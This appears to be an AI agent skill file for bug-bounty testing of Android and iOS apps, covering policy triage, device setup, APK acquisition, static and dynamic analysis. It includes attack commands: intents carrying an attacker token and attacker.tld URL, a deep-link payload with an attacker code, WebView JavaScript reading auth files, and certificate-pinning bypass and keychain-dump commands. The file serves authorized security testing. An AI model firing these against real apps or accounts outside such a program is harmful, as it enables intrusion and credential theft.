---
name: mobile-mode
description: ORACLE mode for MOBILE app security testing. Activate on: "MOBILE", "MOBILE MODE", Android, iOS, APK, IPA, Frida, WebView, deeplink, certificate pinning, URL scheme, intent attack, MobSF, objection, INSTALL_FAILED_MISSING_SPLIT, arm64, emulator. Use when a target ships Android/iOS apps: policy triage gate, device preflight, APK acquisition and split install, static + dynamic analysis, intent/deeplink/URL-scheme attacks, WebView exploitation, cert-pinning bypass, mobile-only API and auth bypass.
---

# ORACLE — Mobile Mode

## STEP 0 — POLICY TRIAGE GATE (do this BEFORE any tooling)

A mobile finding is only worth what the program says it is worth. Most programs
publish an explicit mobile exclusion list, and the classes hunters report first
are the classes that get closed Informative.

```bash
# pull the mobile exclusion list, then answer these five questions
grep -iE "root|jailbreak|adb|physical|webview|obfuscat|pinning|backup|emulator" \
  <program-policy>
```

| Program says | Then |
|---|---|
| "Leaked information from Mobile **(without rooting)**" | Your PoC MUST reproduce on a stock device. Rooted-only = dead. |
| "Vulnerabilities requiring **ADB access** are out of scope" | `allowBackup=true` is worthless here. Skip it. |
| "**WebView exploitation** out of scope" | The richest Android class is gone. Do not burn a week on it. |
| "**SSL pinning bypass** / lack of obfuscation / root detection" non-qualifying | Never file it. It is boilerplate. |
| "Server-side vulns found **through** the app stay in scope" | Hunt the API via the app as a map. Same reward chart. |

**A rooted/emulated device is frequently a LIABILITY, not an asset.** Read the
exclusions before you decide whether to root, and before you trust any finding
you can only reproduce on a rooted box.

Full gate with per-program policy text: `SKILL_FILES/01_policy_triage_gate.md`

## MODE IDENTITY

| Class | Android | iOS |
|---|---|---|
| Static | jadx, apktool, APKiD, androguard, apkleaks | class-dump, Ghidra/Hopper, MobSF, plutil |
| Dynamic | Frida, objection, Burp, drozer, logcat | Frida, objection, Burp, SSL Kill Switch 2 |
| Link attacks | Intent + deep link / App Link | Custom URL scheme + Universal Link |
| WebView | addJavascriptInterface bridge RCE | WKWebView bridge checks |
| Pinning bypass | Frida codeshare, objection, Magisk, apktool patch | Frida, SSL Kill Switch 2 |
| API/auth | Mobile-only endpoints, weaker versioned auth | Keychain misconfig, biometric bypass |

Every finding is a chain primitive: link → auth bypass → data leak → ATO.

---

## STEP 1 — DEVICE PREFLIGHT (cheap, and it kills whole classes of dead ends)

Run this **before** concluding an app cannot run on your box. Emulators and
containers increasingly emulate ARM, and every modern app is arm64-only.

```bash
adb shell getprop ro.product.cpu.abi                 # host arch (often x86_64)
adb shell getprop ro.dalvik.vm.native.bridge         # libndk_translation.so => ARM WORKS
adb shell getprop ro.product.cpu.abilist             # includes arm64-v8a => ARM WORKS
adb shell getprop persist.sys.locale                 # en-US blocks SEA/ID/BR-only apps
adb shell pm list packages | grep -E "vending|gms"   # Play Store present?
```

**The trap that kills beginners:** you see `arm64-v8a` only native libs, an
x86_64 emulator, and conclude "can't run this app, drop the target." Wrong on
Android-x86 / WayDroid / modern emulators. `libndk_translation.so` in
`ro.dalvik.vm.native.bridge` means **arm64 native code executes**. Verified on
this box: an arm64-only Indonesian fintech app installed and ran to its live
login screen.

Region check: Grab/Gojek = SEA, OVO = Indonesia, iFood/PagSeguro = Brazil,
Just Eat = non-US. An `en-US` store account cannot resolve them. Fetch the APK
directly instead (Step 2).

Full preflight: `SKILL_FILES/00_environment_preflight.md`

## STEP 2 — ACQUIRE THE APK (bundles are the norm now)

Nearly every current app ships as an **App Bundle** split by ABI, language and
density. Downloading a base APK alone fails:

```
Failure [INSTALL_FAILED_MISSING_SPLIT: Missing split for <pkg>]
```

That is not a broken download, it is a bundle. Get the XAPK and install-multiple.

```bash
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
curl -sL -A "$UA" -o app.xapk "https://d.apkpure.com/b/XAPK/<pkg>?version=latest"
unzip -o app.xapk -d app/
ls app/                       # base.apk + config.arm64_v8a.apk + config.<locale>.apk
adb install-multiple -r -g app/base.apk app/config.arm64_v8a.apk app/config.xxhdpi.apk
```

- A browser **User-Agent is mandatory**; curl's default UA gets 403.
- `/b/APK/` gives base-only (will not install). `/b/XAPK/` gives the splits.
- `adb install-multiple` works because the emulator advertises `arm64-v8a`.
- Never run the app's Play Store licensing check noise as a finding:
  `GoogleCertificatesRslt: not allowed: pkg=<pkg>` just means you sideloaded.

Verify + launch:

```bash
adb shell dumpsys package <pkg> | grep -i primaryCpuAbi     # arm64-v8a is CORRECT
adb shell cmd package resolve-activity --brief -c android.intent.category.LAUNCHER <pkg>
adb shell am start -n <pkg>/<resolved.activity>
adb shell dumpsys window | grep mCurrentFocus                # what actually opened
```

## STEP 3 — MANIFEST WITHOUT DECODING (fastest triage in the mode)

`dumpsys` is faster and more reliable than decoding, and works on an installed
app with zero tooling:

```bash
adb shell dumpsys package <pkg> > pkg.txt
```

Extract intent filters. **Critical gotcha: dumpsys prints the host as
`Authority: "host": port`, NOT `Host:`.** Grepping for `Host:` silently returns
nothing and makes every filter look unhosted — you will build a theory on an
artifact. See `SKILL_FILES/03_intent_deeplink_audit.md` for a correct parser.

Decoded-manifest route (needs a readable path — see tool gotchas):

```bash
apktool d -f -o apk_out/ app.apk
grep -E 'android:scheme|android:host|android:path' apk_out/AndroidManifest.xml
grep -E 'debuggable|allowBackup|usesCleartextTraffic|networkSecurityConfig' apk_out/AndroidManifest.xml
```

## TOOLCHAIN SETUP

```bash
# Android
jadx -d java_out/ app.apk                                  # decompile (slow on 20+ dex)
jadx --no-res -d java_out/ app.apk                         # skip resources = much faster
apkleaks -f app.apk -o apkleaks.txt                        # automated secret scan
apktool d -f app.apk -o apk_out/                            # smali + manifest
APKiD app.apk                                              # run FIRST — detects packers

adb shell settings put global http_proxy 127.0.0.1:8080     # proxy via Burp
adb shell settings put global http_proxy :0                 # reset

# MobSF
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# iOS
unzip app.ipa -d ipa_out/ && plutil -p ipa_out/Payload/App.app/Info.plist
```

### FRIDA VERSION MATRIX — read before touching Frida

| Version | Android Java bridge | Note |
|---|---|---|
| **16.x (pin 16.5.7)** | **WORKS** | Verified here: spawn + `Java.perform` + `ActivityThread` resolve all pass |
| 17.x | reported broken for Android app hooking | Re-verify before upgrading; do not "fix" it by upgrading |

```bash
pipx install frida-tools==13.7.1        # CLI venv
pip install --user "frida==16.5.7" "frida-tools==13.7.1"
# device: frida-server MUST be the same version as `frida --version`
```

**`--no-pause` does not exist on Frida 16+. It hard-errors:**
`frida: error: unrecognized arguments: --no-pause`. Spawn resumes by default;
`--pause` now opts *in* to pausing. Remove it from every command you have seen.

```bash
frida -U -f com.target.app -l script.js                    # correct, 16.x+
```

**Version-split-brain:** pipx venv and pip user-site can hold different frida
versions, so `frida --version` and `python3 -c "import frida"` disagree and your
Frida scripts fail mysteriously. Pin both.

**PATH trap:** `frida`/`frida-ps`/`mitmproxy` live in `~/.local/bin`. If `~/.zshrc`
lacks the PATH export (very common — `~/.bashrc` has it, zsh does not), every
one of them reports "command not found" while being perfectly installed.

**frida-server persistence:** `/data/local/tmp` gets wiped. Install to
`/data/local/tmp` but autostart from Magisk `/data/adb/service.d/frida-server.sh`
so a wipe cannot silently kill it. Always verify before trusting a note:
`adb shell su -c "ps -A | grep frida-server"`.

Full environment guide: `SKILL_FILES/00_environment_preflight.md`

---

## ANDROID — STATIC ANALYSIS

```bash
grep -rn "http://" java_out/                      # cleartext
grep -rniE "api_key|secret|password|token|client_secret" java_out/
grep -rniE "firebase|AKIA|googleapis" java_out/
grep -rhoE "https?://[a-z0-9.-]+\.[a-z]{2,}[a-zA-Z0-9/._-]*" java_out/ \
  | sed -E 's#(https?://[^/]+).*#\1#' | sort | uniq -c | sort -rn | head -30
```

That last one builds the **backend attack map in one command** and needs no
device at all. Rank by reference count — the top host is the primary API.

**Signals:** `exported="true"`; `allowBackup="true"` *(check the policy gate —
frequently excluded)*; `debuggable="true"`; `usesCleartextTraffic="true"`; API
hosts absent from the web app; dev/staging hostnames left in a release build.

**Native layer triage:** list ABIs and libs to learn what you *cannot* test.

```bash
python3 -c "
import zipfile,sys
z=zipfile.ZipFile('base.apk')
print(sorted({n.split('/')[1] for n in z.namelist() if n.startswith('lib/')}))"
# anti-fraud / liveness / obfuscation libs are native and out of reach — and
# you do not need them. Attack the Java/Kotlin layer and the API instead.
```

## ANDROID — INTENT ATTACKS

```bash
adb shell am start -n com.target.app/.InternalActivity --es token ATTACKER_TOKEN
adb shell am broadcast -a com.target.app.ACTION_UPDATE --es url http://attacker.tld
adb shell am startservice -n com.target.app/.BackgroundService --es cmd exfil

# Never blind-fire a money route or an auth callback on a third-party service.
# Resolve first, non-destructively:
adb shell cmd package query-activities -a android.intent.action.VIEW -d "<uri>"
```

## ANDROID — DEEP LINK ATTACKS

**URI composition rules** — get these wrong and every test silently "fails":

A filter with `scheme` + `authority` + `LITERAL path` needs all three:

```
filter:  scheme=gxsdev  authority=ovo.id  path=/oauth-callback
test:    gxsdev://ovo.id/oauth-callback?code=...      <-- CORRECT
         gxsdev://oauth-callback                      <-- WRONG (path is empty)
         gxsdev:///oauth-callback                     <-- WRONG (authority empty)
```

`scheme://name` where `name` looks like a route (`ovo://transfer`) is an
**authority**, not a path. A `<data>` element with no `path` matches any path.

```bash
# non-destructive resolution check FIRST
adb shell cmd package query-activities -a android.intent.action.VIEW -d "gxsdev://ovo.id/oauth-callback"
```

**High-value route names in fintech apps** — these are the money:
`login`, `transfer`, `withdrawal`, `topup`, `paybill`, `paylater`, `checkout`,
`kyc`, `scan`, `verifyemail`, `webview`, `jsbridgewebcontainer`, `upgrade`.

**Dev/staging schemes in a production APK** (`*-dev`, `*-stg`, `*-uat` schemes)
is a genuine reportable misconfiguration. It is **not** by itself an account
takeover — see the honesty gate below.

```html
<a href="gxsdev://ovo.id/oauth-callback?code=ATTACKER">click</a>
```

## ANDROID — WEBVIEW ATTACKS

```java
webView.addJavascriptInterface(new Bridge(), "Android");   // any XSS -> native RCE
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
```

```javascript
Android.getToken();
new XMLHttpRequest().open("GET","file:///data/data/com.target.app/shared_prefs/auth.xml");
```

**A JS-bridge web container exposed behind a browsable deep link** (route names
like `jsbridgewebcontainer`, `webview`) is the highest-value WebView lead on a
fintech app. Check the policy gate first — some programs exclude WebView
exploitation outright, and on those this class is dead on arrival.

## CERTIFICATE PINNING BYPASS

```bash
# Android
frida -U -f com.target.app -l bypass.js          # 16.x, NO --no-pause
frida -U -f com.target.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass-with-frida
objection -g com.target.app explore               # then: android sslpinning disable
apktool d app.apk -o patched/  &&  apktool b patched/ -o patched.apk   # patch network_security_config.xml

# iOS
frida -U -f com.target.app -l ios-ssl-bypass.js
objection -g com.target.app explore               # then: ios sslpinning disable
```

Edge cases: OkHttp → hook `okhttp3.CertificatePinner.check$okhttp`; custom
TrustManager → hook `checkServerTrusted`; Flutter → `reFlutter`.

**Check whether pinning even exists before spending time on it.** Grep the
decompiled source and the manifest `networkSecurityConfig` first. A backend
described as plain HTTPS may not pin at all.

## IOS — STATIC / DYNAMIC / URL SCHEME

```bash
plutil -p ipa_out/Payload/App.app/Info.plist    # URL schemes, ATS
strings ipa_out/Payload/App.app/App | grep -iE "api|key|secret|token|http://"
objection -g com.target.app explore             # ios keychain dump / biometric / clipboard
```

**iOS reality check:** a downloaded `.ipa` is usually FairPlay-encrypted and
useless until dumped from a paired device. iOS dynamic testing needs a Mac +
real device or simulator. Many hunters should stay Android-only unless they have
Apple hardware — do not promise an iOS test you cannot run.

Custom scheme → Universal Link bypass: if the app verifies `https://domain` but
the custom scheme is still registered, skip domain verification via the scheme.

## MOBILE API ATTACKS

1. Proxy through Burp (bypass pinning only if it exists).
2. Map every endpoint. Static host extraction does step 2 without a device.
3. Diff against web-app endpoints → mobile-only ones are the interesting ones.
4. Test for: missing auth, BOLA, mass assignment, version skew.
5. Replay static hardcoded keys found in step 1.

Mobile-only endpoint with no auth · API version skew (mobile `v1` unrate-limited
vs web `v3`) · hardcoded admin key in the APK · device-registration endpoint
accepting arbitrary `device_id` → push hijack · upload endpoint with no
content-type validation.

---

## HONESTY GATE — CONFIRMED-REACHABLE vs IMPACT-PROVEN

Keep these separate in your notes and in the report. This is the single most
common way hunters waste a week, and the most common way reports get rejected.

| Status | Meaning | Reportable as |
|---|---|---|
| **MAPPED** | Found in manifest / dumpsys / jadx. Not fired. | Nothing. |
| **CONFIRMED REACHABLE** | `query-activities` resolves it, or it fires. | Misconfiguration (low) |
| **IMPACT PROVEN** | You demonstrated the actual security effect. | Real severity |

Worked example from a real session: a banking SDK OAuth callback resolved from
`gxsdev://` and `gxsstg://` (dev/staging schemes in a production APK) — that is
**CONFIRMED REACHABLE**, and worth filing as a misconfiguration. Firing it with
an attacker `code` changed no app state, because the handler was behind an
authenticated session. That is **NOT** authorization-code injection and **NOT**
ATO. Writing it up as ATO would have burned the relationship.

An activity behind auth that ignores your intent because you are logged out
proves **nothing** about its behaviour while logged in. Say so, then get a
session.

## ORACLE OUTPUT CONTRACT (mobile)

```
TL;DR: <one line>
Policy gate: <program's mobile exclusions, and what they kill>
Device preflight: <arch, NDK translation yes/no, region gate yes/no>
Bundle: <base + splits, or single APK>
Plan: 1) static 2) manifest/deeplink 3) dynamic 4) API/auth
Commands / Frida scripts: <code blocks>
Backend map: <hosts by reference count>
Deep-link routes: <scheme://authority/path, status per route: MAPPED/CONFIRMED/PROVEN>
Status: <per finding — MAPPED | CONFIRMED REACHABLE | IMPACT PROVEN>
Chain potential: <escalation, and what is still unproven>
Triage angle: <screenshot, Burp, logcat evidence>
```

## Deep-dive files

- `SKILL_FILES/00_environment_preflight.md` — device checks, NDK translation,
  APK acquisition + splits, Frida version matrix, PATH/split-brain/tool gotchas
- `SKILL_FILES/01_policy_triage_gate.md` — reading mobile exclusions, what is
  billable, per-program patterns, root/emulator liability
- `SKILL_FILES/02_real_world_scenarios.md` — end-to-end worked scenarios
  including a verified fintech-app hunt
- `SKILL_FILES/03_intent_deeplink_audit.md` — correct `dumpsys` parser,
  URI composition, route triage, JS-bridge leads
- `SKILL_FILES/04_static_workflow.md` — jadx/apktool recipes, backend map,
  native triage, secret hunting
- `SKILL_FILES/05_frida_dynamic.md` — 16.x invocation, scripts, pinning bypass,
  persistence, what to instrument